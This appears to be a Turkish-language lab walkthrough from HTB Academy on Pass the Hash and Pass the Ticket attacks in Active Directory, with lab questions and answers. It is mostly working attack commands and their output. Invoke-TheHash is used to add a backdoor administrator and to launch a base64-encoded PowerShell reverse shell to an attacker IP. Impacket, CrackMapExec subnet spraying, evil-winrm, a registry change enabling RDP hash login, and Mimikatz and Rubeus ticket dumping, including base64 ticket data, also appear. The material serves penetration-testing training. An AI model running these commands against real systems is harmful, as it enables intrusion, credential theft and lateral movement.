Windows üzerinde Pass the Hash saldırıları gerçekleştirmek için kullanabileceğimiz bir diğer araç ise [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). Bu araç WMI ve SMB ile Pass the Hash saldırıları gerçekleştirmek için PowerShell fonksiyonlarının bir koleksiyonudur. WMI ve SMB bağlantılarına .NET TCPClient aracılığıyla erişilir. Kimlik doğrulama, NTLMv2 kimlik doğrulama protokolüne bir NTLM hash'i iletilerek gerçekleştirilir. Client tarafında lokal yönetici ayrıcalıkları gerekli değildir, ancak kimlik doğrulama için kullandığımız kullanıcı ve hash'in hedef bilgisayarda yönetici haklarına sahip olması gerekir. Bu örnek için `julio` kullanıcısını ve `64F12CDDAA88057E06A81B54E73B949B` hash'ini kullanacağız.

`Invoke-TheHash` kullanırken iki seçeneğimiz vardır: SMB veya WMI komut yürütme. Bu aracı kullanmak için, hedef bilgisayarda komutları yürütmek üzere aşağıdaki parametreleri belirtmemiz gerekir:


- `Target` (Hedef) - Hedefin host adı veya IP adresi.  
    
- `Username` - Kimlik doğrulama için kullanılacak `kullanıcı` adı.  
    
- `Domain` - Kimlik doğrulama için kullanılacak domain. Bu parametre lokal hesaplarda veya kullanıcı adından sonra @domain kullanıldığında gereksizdir.  
    
- `Hash` - Kimlik doğrulama için NTLM parola hash'i. Bu fonksiyon LM:NTLM veya NTLM formatını kabul edecektir.  
    
- `Command` - Hedef üzerinde çalıştırılacak`komut`. Bir komut belirtilmezse, fonksiyon kullanıcı adı ve hash'in hedefte WMI erişimine sahip olup olmadığını kontrol eder.


Aşağıdaki komut, mark adında yeni bir kullanıcı oluşturmak ve kullanıcıyı Administrators grubuna eklemek için komut yürütme için SMB yöntemini kullanacaktır.


#### Invoke-TheHash with SMB
```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\

PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1

PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

Hedef makinede bir reverse shell bağlantısı da elde edebiliriz. Reverse [shell](“https://academy.hackthebox.com/module/details/115”) 'lere aşina değilseniz HTB Akademi'deki [Shells & Payloads](“https://academy.hackthebox.com/module/details/115”) modülünü inceleyebilirsiniz.  

Reverse shell almak için 172.16.1.5 IP adresine sahip Windows makinemizde Netcat kullanarak listener'ımızı başlatmamız gerekiyor. Port 8001'i bağlantı beklemek için kullanacağız.


#### Netcat Listener
```powershell-session
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
```

PowerShell kullanarak basit bir reverse shell oluşturmak için [https://www.revshells.com/](“https://www.revshells.com/”) adresini ziyaret edebilir, IP `172.16.1.5` ve port `8001`'i ayarlayabilir ve aşağıdaki resimde gösterildiği gibi `PowerShell #3 (Base64)` seçeneğini seçebiliriz.

![Pasted image 20241104173751.png](/img/user/resimler/Pasted%20image%2020241104173751.png)

Şimdi PowerShell reverse shell betiğimizi hedef bilgisayarda çalıştırmak için `Invoke-TheHash` komutunu çalıştırabiliriz. IP adresi olan `172.16.1.10` yerine `DC01` makine adını kullanacağımıza dikkat edin (her ikisi de işe yarar).

#### Invoke-TheHash with WMI
```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1

PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

Sonuç, DC01 hostundan (172.16.1.10) bir reverse shell bağlantısıdır.

![Pasted image 20241104173912.png](/img/user/resimler/Pasted%20image%2020241104173912.png)


## Pass the Hash with Impacket (Linux)
[Impacket](“https://github.com/SecureAuthCorp/impacket”), `Command Execution` ve `Credential Dumping`, `Enumeration` gibi farklı işlemler için kullanabileceğimiz çeşitli araçlara sahiptir. Bu örnek için `PsExec` kullanarak hedef makinede komut yürütme işlemi gerçekleştireceğiz.


#### Impacket PsExec ile Hash'i Geçin
```shell-session
M1R4CKCK@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Impacket araç setinde Pass the Hash saldırılarını kullanarak komut yürütmek için kullanabileceğimiz birkaç araç daha vardır, örneğin:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)


## Pass the Hash with CrackMapExec (Linux)
[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), büyük Active Directory ağlarının güvenliğini değerlendirmeyi otomatikleştirmeye yardımcı olan bir sızma sonrası aracıdır. CrackMapExec'i, local admin olarak başarılı bir şekilde kimlik doğrulaması yapabileceğimiz bir host arayarak ağdaki bazı ya da tüm hostlara kimlik doğrulaması yapmaya çalışmak için kullanabiliriz. Bu yöntem “Password Spraying” olarak da adlandırılır ve Active Directory Enumeration & Attacks modülünde ayrıntılı olarak ele alınmıştır. Bu yöntemin domain hesaplarını kilitleyebileceğini unutmayın, bu nedenle hedef domain'in hesap kilitleme politikasını aklınızda bulundurun ve amacınız buysa, sağlanan kimlik bilgilerini kullanarak belirli bir aralıktaki bir hostta yalnızca bir oturum açma denemesi yapacak olan local account yöntemini kullandığınızdan emin olun.


#### Pass the Hash with CrackMapExec
```shell-session
M1R4CKCK@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

Aynı eylemleri gerçekleştirmek, ancak lokal yönetici parola hash'ini kullanarak bir subnet'teki her host için kimlik doğrulaması yapmak istiyorsak, komutumuza `--local-auth` ekleyebiliriz `.` Bu yöntem, bir hosttaki lokal SAM veritabanını dökerek bir lokal yönetici hash'i elde ettiğimizde ve lokal yönetici parolasının yeniden kullanımı nedeniyle kaç tane (varsa) diğer hostlara erişebileceğimizi kontrol etmek istediğimizde faydalıdır. Eğer `Pwn3d!`'yi görürsek, bu kullanıcının hedef bilgisayarda lokal yönetici olduğu anlamına gelir. Komutları çalıştırmak için `-x` seçeneğini kullanabiliriz. Aynı subnet'teki birçok host'a karşı parolanın yeniden kullanımını görmek yaygındır. Kuruluşlar genellikle aynı lokal yönetici parolasına sahip gold imajlar kullanır veya yönetim kolaylığı için bu parolayı birden fazla hostta aynı şekilde ayarlar. Gerçek dünyadaki bir görevde bu sorunla karşılaşırsak, müşteri için harika bir öneri, [local administrator](“https://www.microsoft.com/en-us/download/details.aspx?id=46899”) parolasını rastgele hale getiren ve sabit bir aralıkta dönecek şekilde yapılandırılabilen [Local Administrator Password Solution'ı (LAPS)](“https://www.microsoft.com/en-us/download/details.aspx?id=46899”) uygulamaktır.

#### CrackMapExec - Command Execution
```shell-session
M1R4CKCK@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```

Aracın kapsamlı özellikleri hakkında daha fazla bilgi edinmek için [CrackMapExec dokümantasyon Wiki](https://web.archive.org/web/20220902185948/https://wiki.porchetta.industries/) 'sini ([NetExec dokümantasyon wiki](https://www.netexec.wiki/)) inceleyin.


## Pass the Hash with evil-winrm (Linux)
[evil-winrm](https://github.com/Hackplayers/evil-winrm), PowerShell remoting ile Pass the Hash saldırısını kullanarak kimlik doğrulaması yapmak için kullanabileceğimiz başka bir araçtır. SMB engellenmişse veya yönetici haklarımız yoksa, hedef makineye bağlanmak için bu alternatif protokolü kullanabiliriz.

#### Pass the Hash with evil-winrm

```shell-session
M1R4CKCK@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Not:** Bir domain hesabı kullanırken, domain adını eklememiz gerekir, örneğin: administrator@inlanefreight.htb


## Pass the Hash with RDP (Linux)

`xfreerdp` gibi araçları kullanarak hedef sisteme GUI erişimi elde etmek için bir RDP PtH saldırısı gerçekleştirebiliriz.  

Bu saldırı için birkaç uyarı var:

- Varsayılan olarak devre dışı olan`Kısıtlı Admin Modu`, hedef hostta etkinleştirilmelidir; aksi takdirde aşağıdaki hata ile karşılaşırsınız:

![Pasted image 20241104175741.png](/img/user/resimler/Pasted%20image%2020241104175741.png)

Bu, `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` altına 0 değerinde yeni bir kayıt defteri anahtarı `DisableRestrictedAdmin` (REG_DWORD) eklenerek etkinleştirilebilir. Aşağıdaki komut kullanılarak yapılabilir:

#### Enable Restricted Admin Mode to Allow PtH

```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![Pasted image 20241104175912.png](/img/user/resimler/Pasted%20image%2020241104175912.png)

Kayıt defteri anahtarı eklendikten sonra, RDP erişimi elde etmek için `/pth` seçeneği ile `xfreerdp` 'yi kullanabiliriz: 

#### Pass the Hash Using RDP
```shell-session
M1R4CKCK@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

![Pasted image 20241104180110.png](/img/user/resimler/Pasted%20image%2020241104180110.png)


## **UAC Limitleri Local Hesaplar için Hash'i Geçme**  

UAC (Kullanıcı Hesabı Denetimi) lokal kullanıcıların remote administration işlemlerini gerçekleştirme yeteneklerini sınırlar. `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` kayıt defteri anahtarı 0 olarak ayarlandığında, yerleşik local admin hesabının (RID-500, "Administrator") uzaktan yönetim görevlerini gerçekleştirmesine izin verilen tek local hesap olduğu anlamına gelir. Bu değerin 1 olarak ayarlanması diğer lokal yöneticilere de izin verir.

**Not:** Bir istisna vardır, `FilterAdministratorToken` (varsayılan olarak devre dışı) kayıt defteri anahtarı etkinleştirilirse (değer 1), RID 500 hesabı (yeniden adlandırılmış olsa bile) UAC korumasına kaydedilir. Bu, bu hesap kullanılırken makineye karşı uzaktan PTH'nin başarısız olacağı anlamına gelir.

Bu ayarlar yalnızca lokal admin hesapları içindir. Bir bilgisayarda admin haklarına sahip bir domain hesabına erişimimiz olursa, o bilgisayarda Pass the Hash'i kullanmaya devam edebiliriz. LocalAccountTokenFilterPolicy hakkında daha fazla bilgi edinmek isterseniz Will Schroeder'in [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167) başlıklı blog yazısını okuyabilirsiniz.


## **Sonraki Adımlar**  

Bu bölümde, Pass the Hash (PtH) saldırısı gerçekleştirmek ve bir hedef ağda yanal olarak hareket etmek için bir kullanıcının parolasının NTLM (RC4-HMAC) hash'ini nasıl kullanacağımızı öğrendik, ancak yanal olarak hareket etmenin tek yolu bu değil. Bir sonraki bölümde, yanal hareket etmek ve farklı kullanıcılar olarak kimlik doğrulaması yapmak için Kerberos protokolünü nasıl kötüye kullanacağımızı öğreneceğiz.


`inlanefreight.htb` domaininden `julio` hesabı için şifre hashini (`64F12CDDAA88057E06A81B54E73B949B`) elde ettiğimizi varsayalım. Windows ve Linux makinelerden Pass the Hash saldırılarını nasıl gerçekleştirebileceğimizi görelim.

**Not:** Kullanacağımız araçlar hedef hostta C:\tools dizininde bulunmaktadır. Makineyi başlattıktan ve alıştırmaları tamamladıktan sonra, bu dizindeki araçları kullanabilirsiniz. Bu laboratuvar iki makine içeriyor, birine (MS01) erişiminiz olacak ve oradan ikinci makineye (DC01) bağlanacaksınız.


Soru : Herhangi bir Pass-the-Hash aracını kullanarak hedef makineye erişin. C:\pth.txt adresinde bulunan dosyanın içeriğini gönderin.

Cevap : 

![Pasted image 20241104184537.png](/img/user/resimler/Pasted%20image%2020241104184537.png)

![Pasted image 20241104184853.png](/img/user/resimler/Pasted%20image%2020241104184853.png)


Soru : Yönetici hash'ini kullanarak RDP üzerinden bağlanmayı deneyin. RDP üzerinden PTH'nin çalışması için 0 olarak ayarlanması gereken kayıt defteri değerinin adı nedir? Kayıt defteri anahtarı değerini değiştirin ve RDP ile hash kullanarak bağlanın. Kayıt defteri değerinin adını cevap olarak gönderin.

Cevap : DisableRestrictedAdmin


Soru : RDP ile bağlanın ve mevcut oturumda sunulan hash'leri çıkarmak için c:\tools içinde bulunan Mimikatz'ı kullanın. David'in hesabının NTLM/RC4 hash'i nedir?
Cevap : 

![Pasted image 20241104185700.png](/img/user/resimler/Pasted%20image%2020241104185700.png)

![Pasted image 20241104185830.png](/img/user/resimler/Pasted%20image%2020241104185830.png)

![Pasted image 20241104191829.png](/img/user/resimler/Pasted%20image%2020241104191829.png)

![Pasted image 20241104191857.png](/img/user/resimler/Pasted%20image%2020241104191857.png)


Soru :David'in hash'ini kullanarak \\DC01\david paylaşımlı klasörüne bağlanmak ve david.txt dosyasını okumak için bir Pass the Hash saldırısı gerçekleştirin
Cevap : 

![Pasted image 20241104192729.png](/img/user/resimler/Pasted%20image%2020241104192729.png)

![Pasted image 20241104192742.png](/img/user/resimler/Pasted%20image%2020241104192742.png)


Soru : Julio'nun hash'ini kullanarak \\DC01\julio paylaşımlı klasörüne bağlanmak ve julio.txt dosyasını okumak için bir Pass the Hash saldırısı gerçekleştirin.
Cevap :

type \\DC01\julio\julio.txt

![Pasted image 20241104193031.png](/img/user/resimler/Pasted%20image%2020241104193031.png)

![Pasted image 20241104193419.png](/img/user/resimler/Pasted%20image%2020241104193419.png)

![Pasted image 20241104193514.png](/img/user/resimler/Pasted%20image%2020241104193514.png)


Soru : Julio'nun hash'ini kullanarak bir Pass the Hash saldırısı gerçekleştirin, bir PowerShell konsolu başlatın ve RDP ile bağlandığınız makineye bir reverse shell oluşturmak için Invoke-TheHash'i içe aktarın (hedef makine, DC01, yalnızca MS01'e bağlanabilir). Reverse shell'i dinlemek için c:\tools'da bulunan nc.exe aracını kullanın. DC01'e bağlandıktan sonra, C:\julio\flag.txt dosyasındaki bayrağı okuyun.

Cevap : 

![Pasted image 20241104194313.png](/img/user/resimler/Pasted%20image%2020241104194313.png)

![Pasted image 20241104194351.png](/img/user/resimler/Pasted%20image%2020241104194351.png)

![Pasted image 20241104194425.png](/img/user/resimler/Pasted%20image%2020241104194425.png)


Soru :İsteğe bağlı: John, MS01 için Remote Management Users üyesidir. John'un hesap hash'ini impacket ile kullanarak MS01'e bağlanmayı deneyin. Sonuç ne oldu? Eğer evil-winrm kullanırsanız ne olur? Bitirdiğinizde BİTTİ olarak işaretleyin.

Cevap : Bitti 


### Windows'tan Pass the Ticket (PtT)
Active Directory ortamında yanal hareket için bir başka yöntem de [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/) (PtT) saldırısı olarak adlandırılır. Bu saldırıda, NTLM parola hash'i yerine yanal olarak hareket etmek için çalınan bir ==Kerberos bileti== kullanırız. Windows ve Linux'tan bir PtT saldırısı gerçekleştirmenin birkaç yolunu ele alacağız. Bu bölümde Windows saldırılarına odaklanacağız ve bir sonraki bölümde Linux'tan yapılan saldırıları ele alacağız.


## **Kerberos Protocol Refresher**
Kerberos kimlik doğrulama sistemi bilet tabanlıdır. Kerberos'un arkasındaki ana fikir, kullandığınız her hizmete bir hesap şifresi vermemektir. Bunun yerine, Kerberos tüm biletleri lokal sisteminizde tutar ve her servise sadece o servise özel bileti sunarak bir biletin başka bir amaç için kullanılmasını engeller.

- `TGT - Ticket Granting Ticket (Bilet Verme Bileti` ) Kerberos sisteminde alınan ilk bilettir. TGT, client'ın ek Kerberos biletleri veya `TGS` almasına izin verir.  
    
- `TGS - Ticket Granting Service (Bilet Verme Hizmeti` ), bir hizmeti kullanmak isteyen kullanıcılar tarafından talep edilir. Bu biletler, hizmetlerin kullanıcının kimliğini doğrulamasına izin verir.

Bir kullanıcı bir `TGT` talep ettiğinde, geçerli timestamp'i parola hash'i ile şifreleyerek domain controller'a kimlik doğrulaması yapmalıdır. Domain controller kullanıcının kimliğini doğruladıktan sonra (çünkü domain kullanıcının parola hash'ini bilir, yani zaman damgasının şifresini çözebilir), kullanıcıya gelecekteki talepleri için bir TGT gönderir. Kullanıcı biletini aldıktan sonra, kim olduğunu parolasıyla kanıtlamak zorunda değildir.

Kullanıcı bir MSSQL veritabanına bağlanmak isterse, Ticket Granting Ticket'ını (TGT) sunarak Key Distribution Center'a (KDC) bir Ticket Granting Service (TGS) talep edecektir. Ardından TGS'yi kimlik doğrulama için MSSQL veritabanı sunucusuna verecektir.

Bu protokolün nasıl çalıştığına dair üst düzey bir genel bakış için [Active Directory'ye Giriş](https://academy.hackthebox.com/module/details/74) modülündeki [Kerberos, DNS, LDAP, MSRPC](https://academy.hackthebox.com/module/74/section/701) bölümüne göz atmanız önerilir.


## Pass the Ticket (PtT) Attack
`Pass the Ticket (PtT)` gerçekleştirmek için geçerli bir Kerberos biletine ihtiyacımız var. Bu olabilir:
- Belirli bir kaynağa erişime izin vermek için Ticket Granting Service (TGS - Bilet Verme Hizmeti).  
    
- Kullanıcının ayrıcalıklara sahip olduğu herhangi bir kaynağa erişmek için hizmet biletleri talep etmek için kullandığımız Ticket Granting Ticket (TGT).

`Pass the Ticket (PtT)` saldırısı gerçekleştirmeden önce, `Mimikatz` ve `Rubeus` kullanarak bir bilet almak için bazı yöntemler görelim.


## **Senaryo**  

Bir pentestte olduğumuzu ve bir kullanıcıyı phish'lemeyi başardığımızı ve kullanıcının bilgisayarına erişim sağladığımızı düşünelim. Bu bilgisayarda yönetici ayrıcalıkları elde etmenin bir yolunu bulduk ve lokal administrator haklarıyla çalışıyoruz. Bu bilgisayarda erişim bileti almanın çeşitli yollarını ve yeni biletleri nasıl oluşturabileceğimizi inceleyelim.

## **Windows'tan Kerberos Biletlerini Toplama**  

Windows'ta, ==biletler LSASS (Local Security Authority Subsystem Service) prosesi tarafından işlenir ve saklanır==. Bu nedenle, bir Windows sisteminden ticket almak için LSASS ile iletişim kurmanız ve talep etmeniz gerekir. ==Yönetici olmayan bir kullanıcı olarak yalnızca biletlerinizi alabilirsiniz, ancak lokal bir administrator olarak her şeyi toplayabilirsiniz.==  

`Mimikatz` modülü `sekurlsa::tickets /export` kullanarak bir sistemden tüm biletleri toplayabiliriz. Sonuç, biletleri içeren `.kirbi` uzantılı dosyaların bir listesidir.



#### Mimikatz - Export Tickets (Tüm Ticket'ları Toplama)
```cmd-session
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 329278 (00000000:0005063e)
Session           : Network from 0
User Name         : DC01$
Domain            : HTB
Logon Server      : (null)
Logon Time        : 7/12/2022 9:39:55 AM
SID               : S-1-5-18

         * Username : DC01$
         * Domain   : inlanefreight.htb
         * Password : (null)
         
        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
           Target Name  (--) : @ inlanefreight.htb
           Client Name  (01) : DC01$ ; @ inlanefreight.htb
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             31cfa427a01e10f6e09492f2e8ddf7f74c79a5ef6b725569e19d614a35a69c07
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !

        Group 2 - Ticket Granting Ticket

<SNIP>

mimikatz # exit
Bye!
c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi

<SNIP>
```

Sonu `$` ile biten biletler, Active Directory ile etkileşim kurmak için bir bilete ihtiyaç duyan bilgisayar hesabına karşılık gelir. Kullanıcı biletlerinde kullanıcının adı ve ardından servis adını ve domain'i ayıran bir `@` işareti bulunur, örneğin: `[randomvalue]-username@service-domain.local.kirbi`.

**Not:** krbtgt servisi ile bir bilet seçerseniz, bu hesabın TGT'sine karşılık gelir.

Ayrıca `Rubeus` ve `dump` seçeneğini kullanarak biletleri dışa aktarabiliriz. Bu seçenek tüm biletlerin dump'ını almak için kullanılabilir (eğer local administrator olarak çalışıyorsa). `Rubeus dump`, bize bir dosya vermek yerine, bileti base64 formatında kodlanmış olarak yazdıracaktır. Daha kolay kopyala-yapıştır için `/nowrap` seçeneğini ekliyoruz.  

**Not:** Yazım sırasında, Mimikatz sürüm 2.2.0 20220919 kullanarak, “sekurlsa::ekeys” çalıştırırsak, bazı Windows 10 sürümlerinde tüm hash'leri des_cbc_md4 olarak sunar. Dışa aktarılan biletler (sekurlsa::tickets /export) yanlış şifreleme nedeniyle düzgün çalışmaz. Yeni biletler oluşturmak için bu hashleri kullanmak veya biletleri base64 formatında dışa aktarmak için Rubeus kullanmak mümkündür.

#### Rubeus - Export Tickets
```cmd-session
c:\tools> Rubeus.exe dump /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x6c680
    ServiceName           :  krbtgt/inlanefreight.htb
    ServiceRealm          :  inlanefreight.htb
    UserName              :  DC01$
    UserRealm             :  inlanefreight.htb
    StartTime             :  7/12/2022 9:39:54 AM
    EndTime               :  7/12/2022 7:39:54 PM
    RenewTill             :  7/19/2022 9:39:54 AM
    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
    Base64EncodedTicket   :

doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2ihO+FY/2Rr0g0iHowOYOgn7EBV3JYEDTNZS2ErKNLVOh0/TczLexQk+bKTMh55oNNQDVzmarvzByKYC0XRTjb1jPuVz4exraxGEBTgJYUunCy/R5agIa6xuuGUvXL+6AbHLvMb+ObdU7Dyn9eXruBscIBX5k3D3S5sNuEnm1sHVsGuDBAN5Ko6kZQRTx22A+lZZD12ymv9rh8S41z0+pfINdXx/VQAxYRL5QKdjbndchgpJro4mdzuEiu8wYOxbpJdzMANSSQiep+wOTUMgimcHCCCrhXdyR7VQoRjjdmTrKbPVGltBOAWQOrFs6YK1OdxBles1GEibRnaoT9qwEmXOa4ICzhjHgph36TQIwoRC+zjPMZl9lf+qtpuOQK86aG7Uwv7eyxwSa1/H0mi5B+un2xKaRmj/mZHXPdT7B5Ruwct93F2zQQ1mKIH0qLZO1Zv/G0IrycXxoE5MxMLERhbPl4Vx1XZGJk2a3m8BmsSZJt/++rw7YE/vmQiW6FZBO/2uzMgPJK9xI8kaJvTOmfJQwVlJslsjY2RAVGly1B0Y80UjeN8iVmKCk3Jvz4QUCLK2zZPWKCn+qMTtvXBqx80VH1hyS8FwU3oh90IqNS1VFbDjZdEQpBGCE/mrbQ2E/rGDKyGvIZfCo7t+kuaCivnY8TTPFszVMKTDSZ2WhFtO2fipId+shPjk3RLI89BT4+TDzGYKU2ipkXm5cEUnNis4znYVjGSIKhtrHltnBO3d1pw402xVJ5lbT+yJpzc